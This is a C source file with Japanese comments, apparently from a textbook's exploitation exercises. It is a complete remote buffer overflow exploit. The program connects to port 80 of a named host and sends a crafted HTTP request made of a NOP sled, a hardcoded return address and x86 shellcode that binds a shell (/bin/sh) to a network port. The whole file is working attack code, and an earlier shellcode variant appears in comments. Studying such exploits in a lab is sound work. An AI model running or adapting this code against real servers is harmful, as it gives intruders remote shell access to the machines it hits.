#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include "hacking.h"
#include "hacking-network.h"

#define OFFSET 540
#define RETADDR 0xffffd528

char shellcode[] = "\x6a\x66\x58\x99\x31\xdb\x43\x53\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x52\x66\x68\x9a\x67\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x53\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";

// もとのシェルコード:\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
// 6a66589931db43536a016a0289e1cd80966a6658435266689a67665389e16a10515689e1cd80b066434353535689e1cd80b0664353525689e1cd80936a0259b03fcd804979f9b00b52682f2f7368682f62696e89e35289e25389e1cd80
// \x6a\x66\x58\x99\x31\xdb\x43\x53\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43\x52\x66\x68\x9a\x67\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x53\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80

int main(int argc, char const *argv[])
{
  int sockfd, bufflen;
  struct hostent *host_info;
  struct sockaddr_in target_addr;
  unsigned char buffer[600];

  if (argc < 2)
  {
    printf("使用方法: %s <ホスト名>\n", argv[0]);
    exit(1);
  }

  if ((host_info = gethostbyname(argv[1])) == NULL)
  {
    fatal("ホスト名の検索に失敗しました");
  }
  if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
  {
    fatal("ソケットの生成に失敗しました");
  }

  target_addr.sin_family = AF_INET;
  target_addr.sin_port = htons(80);
  target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
  memset(&(target_addr.sin_zero), '\0', 8); // ゼロクリア

  if (connect(sockfd, (struct in_addr *)&target_addr, sizeof(struct sockaddr)) == -1)
  {
    fatal("攻撃対象サーバへの接続に失敗しました");
  }

  bzero(buffer, 600);                                 // バッファをゼロクリア
  memset(buffer, '\x90', OFFSET);                     // NOPスレッドを構築する
  *((u_int *)(buffer + OFFSET)) = RETADDR;            // 戻りアドレスを埋める
  memcpy(buffer + 300, shellcode, strlen(shellcode)); // シェルコード
  strcat(buffer, "\r\n");                             // 文字列を終端させる
  printf("脆弱性攻撃バッファ:\n");
  dump(buffer, strlen(buffer)); // 脆弱性攻撃バッファを表示
  send_string(sockfd, buffer);  // 脆弱性攻撃バッファをHTTPリクエストとして送信する

  return 0;
}
